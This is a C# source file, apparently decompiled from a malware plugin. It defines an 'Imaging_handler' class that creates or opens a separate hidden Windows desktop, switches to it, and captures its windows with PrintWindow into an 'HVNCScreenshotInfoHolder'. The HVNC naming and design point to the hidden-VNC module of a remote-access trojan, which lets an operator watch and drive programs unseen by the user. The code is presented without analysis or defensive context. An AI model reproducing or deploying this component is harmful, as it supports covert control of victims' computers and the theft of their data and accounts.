

using System;
using System.Drawing;


namespace Plugin.Helper
{
	public class Imaging_handler
	{
		private int _screenshotWindowCount;
		public IntPtr Desktop = IntPtr.Zero;

		public Imaging_handler(string DesktopName)
		{
			IntPtr num = Utils.OpenDesktop(DesktopName, 0, true, 511U);
			if (num == IntPtr.Zero)
				num = Utils.CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, 511U, IntPtr.Zero);
			this.Desktop = num;
		}

		public static float GetScalingFactor()
		{
			using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
			{
				IntPtr hdc = graphics.GetHdc();
				int deviceCaps = Utils.GetDeviceCaps(hdc, 10);
				return (float) Utils.GetDeviceCaps(hdc, 117) / (float) deviceCaps;
			}
		}

		public bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
		{
			bool flag = false;
			Utils.RECT lpRect;
			Utils.GetWindowRect(hWnd, out lpRect);
			float scalingFactor = Imaging_handler.GetScalingFactor();
			IntPtr compatibleDc = Utils.CreateCompatibleDC(DC);
			IntPtr compatibleBitmap = Utils.CreateCompatibleBitmap(DC, (int) ((double) (lpRect.right - lpRect.left) * (double) scalingFactor), (int) ((double) (lpRect.bottom - lpRect.top) * (double) scalingFactor));
			Utils.SelectObject(compatibleDc, compatibleBitmap);
			uint nFlags = 2;
			if (Utils.PrintWindow(hWnd, compatibleDc, nFlags))
			{
				try
				{
					Bitmap bitmap = Image.FromHbitmap(compatibleBitmap);
					ModifiableScreen.DrawImage((Image) bitmap, new Point(lpRect.left, lpRect.top));
					bitmap.Dispose();
					flag = true;
				}
				catch
				{
				}
			}
			Utils.DeleteObject(compatibleBitmap);
			Utils.DeleteDC(compatibleDc);
			return flag;
		}

		public void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
		{
			IntPtr topWindow = Utils.GetTopWindow(owner);
			if (topWindow == IntPtr.Zero)
				return;
			IntPtr window = Utils.GetWindow(topWindow, Utils.GetWindowType.GW_HWNDLAST);
			if (window == IntPtr.Zero)
				return;
			for (; window != IntPtr.Zero; window = Utils.GetWindow(window, Utils.GetWindowType.GW_HWNDPREV))
				this.DrawHwnd(window, ModifiableScreen, DC);
		}

		public void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
		{
			if (!Utils.IsWindowVisible(hWnd))
				return;
			++this._screenshotWindowCount;
			this.DrawApplication(hWnd, ModifiableScreen, DC);
			if (Environment.OSVersion.Version.Major >= 6)
				return;
			this.DrawTopDown(hWnd, ModifiableScreen, DC);
		}

		public void Dispose()
		{
			Utils.CloseDesktop(this.Desktop);
			GC.Collect();
		}

		public HVNCScreenshotInfoHolder Screenshot()
		{
			Utils.SetThreadDesktop(this.Desktop);
			IntPtr dc = Utils.GetDC(IntPtr.Zero);
			Utils.RECT lpRect;
			Utils.GetWindowRect(Utils.GetDesktopWindow(), out lpRect);
			float scalingFactor = Imaging_handler.GetScalingFactor();
			Bitmap _image = new Bitmap((int) ((double) lpRect.right * (double) scalingFactor), (int) ((double) lpRect.bottom * (double) scalingFactor));
			Graphics ModifiableScreen = Graphics.FromImage((Image) _image);
			this.DrawTopDown(IntPtr.Zero, ModifiableScreen, dc);
			ModifiableScreen.Dispose();
			Utils.ReleaseDC(IntPtr.Zero, dc);
			int screenshotWindowCount = this._screenshotWindowCount;
			this._screenshotWindowCount = 0;
			return new HVNCScreenshotInfoHolder(_image, screenshotWindowCount);
		}

		public enum DeviceCap
		{
			VERTRES = 10, // 0x0000000A
			DESKTOPVERTRES = 117, // 0x00000075
		}
	}
}
